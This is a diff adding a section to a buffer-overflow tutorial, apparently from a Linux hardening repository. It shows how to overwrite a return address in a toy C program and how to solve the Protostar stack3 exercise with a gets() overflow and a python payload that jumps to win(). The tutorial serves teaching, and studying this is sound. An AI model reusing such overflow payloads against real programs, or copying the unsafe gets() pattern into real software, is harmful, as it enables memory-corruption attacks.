@@ -136,6 +136,11 @@ Lets just go back to the disassembled main function and calculate how much we ha
 
 ![](https://github.com/nu11secur1ty/Linux_hardening_and_security/blob/master/Stack/Linux%20Buffer%20Overflows%20x86%20%E2%80%93%20Part%202%20(%20Overwriting%20and%20manipulating%20the%20RETURN%20address)/wall/8.png)
 
+-> And now we will add 7 to the ret pointer.
+
+```c
+(*ret) += 7;
+```
 
 So our final code should look like:
 
@@ -170,6 +175,176 @@ printf("The value of random is: %d\n",random);
 
 }
 ```
+So, now we will compile our code.
+
+```bash
+gcc -ggdb -fno-stack-protector -z execstack -o random random.c -m32
+```
+Since we are adding code and re-compiling the program, the memory addresses will get changed.
+
+Lets take a look at the new memory addresses.
+
+
+![](https://github.com/nu11secur1ty/Linux_hardening_and_security/blob/master/Stack/Linux%20Buffer%20Overflows%20x86%20%E2%80%93%20Part%202%20(%20Overwriting%20and%20manipulating%20the%20RETURN%20address)/wall/new_disas_main.png)
+
+
+-> Now the assignment instruction random = 1; is at address 0x08048452 and the next address which we want the return address to point is 0x08048459. The difference between these addresses is still 7. So we are good till now.
+
+Hopefully by executing this we will get the output as “The value of random is: 0”
+
+![](https://github.com/nu11secur1ty/Linux_hardening_and_security/blob/master/Stack/Linux%20Buffer%20Overflows%20x86%20%E2%80%93%20Part%202%20(%20Overwriting%20and%20manipulating%20the%20RETURN%20address)/wall/11.png)
+
+- Fuuuck !!!
+
+Why did it gave the Segmentation fault (core dumped)? That means maybe the process is trying to access a memory that doesn’t exist or something.
+
+Note:- Well this was really tricky for me atleast. Computers works in mysterious ways, it is not just mathematics, numbers and science ( Yeah I am being dramatic)
+
+Lets fire up our binary in GDB and see whats wrong.
+
+![](https://github.com/nu11secur1ty/Linux_hardening_and_security/blob/master/Stack/Linux%20Buffer%20Overflows%20x86%20%E2%80%93%20Part%202%20(%20Overwriting%20and%20manipulating%20the%20RETURN%20address)/wall/12.png)
+
+
+-> As you can see we set a breakpoint at line 4 and run the program. The breakpoint hits and the program halts. Then we examine the stack top and what we see, the distance between the start of the buffer and the start of return address is not 12, its 13. (It doesn’t even make sense mathematically). Three full block adds up for 12 bytes (4 bytes each) and 1 byte for that ‘A’ i.e 41.
+
+-> Our buffer had value “ABCDE” in it. And A in ASCII hex is 41. From 41 to just right before of the return address 0x08048452, the count is 13 which traditionally is not correct. I still don’t know why the difference is 13 instead of 12, if anyone knows kindly tell me in the comments section.
+
+-> So we just change our code from ret = buffer + 12; to ret = buffer + 13;
+
+Now the final code will look like this:
+
+
+```c
+void function()
+
+{
+
+char buffer[5]= “ABCDE”;
+
+int *ret;
+
+ret = buffer + 13;
+
+(*ret) += 7;
+
+}
+
+void main()
+
+{
+
+int random;
+
+random = 0;
+
+function();
+
+random = 1;
+
+printf("The value of random is: %d\n",random);
+
+}
+```
+
+Now, we re-compile it and run and hope its now going to give a desired output.
+
+
+![](https://github.com/nu11secur1ty/Linux_hardening_and_security/blob/master/Stack/Linux%20Buffer%20Overflows%20x86%20%E2%80%93%20Part%202%20(%20Overwriting%20and%20manipulating%20the%20RETURN%20address)/wall/13.png)
+
+
+Before continuing lets see this again in GDB:
+
+![](https://github.com/nu11secur1ty/Linux_hardening_and_security/blob/master/Stack/Linux%20Buffer%20Overflows%20x86%20%E2%80%93%20Part%202%20(%20Overwriting%20and%20manipulating%20the%20RETURN%20address)/wall/14.png)
+
+> So, we can see now after 7 is added to the ret pointer, the return address is now 0x08048459 which means we have successfully skipped past the assignment instruction and overwritten the return address to manipulate our way around the program flow to alter the program execution.
+
+Till now we learnt a very important part of buffer overflow i.e how to manipulate and overwrite the return address to alter the program execution flow.
+
+Now, lets another example where we can overwrite the return address in more similar ‘buffer overflow’ fashion.
+
+We will use the program from protostar buffer overflow series.
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void win()
+{
+printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+volatile int (*fp)();
+char buffer[64];
+
+fp = 0;
+
+gets(buffer);
+
+if(fp) {
+printf("calling function pointer, jumping to 0x%08x\n", fp);
+fp();
+}
+}
+```
+Small overview of a program:-
+
+->There is a function win() which has some message saying “code flow successfully changed”. So we assume this is the goal.
+-> Then there is the main(), int pointer fp is declared and defined to ‘0’ along with char array buffer with size 64. The program asks for user input using the gets function and the input is stored in the array buffer.
+-> Then there is an if statement where if fp is not equal to zero then it calls the function pointer jumping to some memory location.
+
+Now we already know that gets function is vulnerable to buffer overflow (visit previous blog) and we have to execute the win() function. So by not wasting time lets find out the where the overflow happens.
+
+First we will compile the code:
+
+
+```c
+gcc -ggdb -fno-stack-protector -z execstack -o stack3 stack3.c -m32
+```
+
+We know that the char array buffer is of 64 bytes. So lets feed input accordingly.
+
+
+![](https://github.com/nu11secur1ty/Linux_hardening_and_security/blob/master/Stack/Linux%20Buffer%20Overflows%20x86%20%E2%80%93%20Part%202%20(%20Overwriting%20and%20manipulating%20the%20RETURN%20address)/wall/15.png)
+
+
+So, as we can see after the 64th byte the overflow occurs and the 65th ‘A’ i.e 41 in ASCII Hex is overwriting the EIP.
+
+Lets confirm this in GDB:
+
+
+![](https://github.com/nu11secur1ty/Linux_hardening_and_security/blob/master/Stack/Linux%20Buffer%20Overflows%20x86%20%E2%80%93%20Part%202%20(%20Overwriting%20and%20manipulating%20the%20RETURN%20address)/wall/16.png)
+
+
+-> As we see the buffer gets overflowed and the EIP is overwritten with ‘A’ i.e 41.
+
+Now lets find the address of the win() function. We can find this with GDB or by objdump.
+
+Objdump is a tool which is used to display information about object files. It comes with almost every Linux distribution.
+
+
+![](https://github.com/nu11secur1ty/Linux_hardening_and_security/blob/master/Stack/Linux%20Buffer%20Overflows%20x86%20%E2%80%93%20Part%202%20(%20Overwriting%20and%20manipulating%20the%20RETURN%20address)/wall/17.png)
+
+
+The -d switch stands for disassemble. When we use this, every function used in a binary is listed, but we just wanted the address of win() function so we just used grep to find our required string in the output.
+
+So it tells us that the win() function’s starting address is 0804846b. To achieve our goal we just have to pass this address after the 64th byte so that the EIP will get overwritten by this address and execute the win() function for us.
+
+But since our machine is little endian (Find more about it here)we have to pass the address in a slightly different manner (basically in reverse). So the address 0804846b will become \x6b\x84\x04\x08 where the \x stands for HEX value.
+
+Now lets just form our input:
+
+```python
+python -c 'print "A" * 64 + "\x6b\x84\x04\x08"' | ./stack3
+```
+
+![](https://github.com/nu11secur1ty/Linux_hardening_and_security/blob/master/Stack/Linux%20Buffer%20Overflows%20x86%20%E2%80%93%20Part%202%20(%20Overwriting%20and%20manipulating%20the%20RETURN%20address)/wall/stack3_overflow_success-768x96.png)
+
+
+
 
 
 
